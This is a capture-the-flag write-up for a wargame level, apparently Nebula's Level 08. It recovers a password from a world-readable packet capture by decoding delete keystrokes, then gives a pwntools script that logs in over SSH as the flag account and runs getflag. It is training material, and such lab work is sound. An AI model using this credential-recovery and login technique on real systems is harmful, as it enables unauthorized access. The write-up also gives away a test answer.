# Level 08

## Discription

> World readable files strike again. Check what that user was up to, and use it to log into flag08 account. \
\
> To do this level, log in as the level08 account with the password level08. Files for this level can be found in /home/flag08.

## Solution

We have a packet capture file in /home/flag08/ directory. Download it your local pc

```bash
scp level08@192.168.56.105:/home/flag08/capture.pcap /tmp/
```

Open it in Wireshark and start looking into tcp stream. We only have one stream but it is kind of interesting.

We have a password but it has some unrecognised characters represented with (.).

So i looked into hex values of password to know hex values of all unrecognised characters.

So these are 7f in hex, lets look them in [ascii table](https://www.sciencebuddies.org/science-fair-projects/references/ascii-table). 7f means delete key is pressed on keyboard.

So the final password should look like backd00Rmate (0d in last is return key or enter key pressed).

## Python

```python
#!/usr/bin/python3

from pwn import *
from sys import argv,exit

if len(argv) < 2:
	sys.exit("Target IP Missing") 

level08 = ssh(host=argv[1],user='level08',password='level08')
file = level08.download_file(remote='/home/flag08/capture.pcap',local='/tmp/capture.pcap')
level08.close()

log.progress(f'flag08 Password : backd00Rmate')

flag08 = ssh(host=argv[1],user='flag08',password='backd00Rmate')
flag08_shell = flag08.shell('sh')
flag08_shell.sendline('getflag') 
flag08_shell.interactive(prompt="") 
```
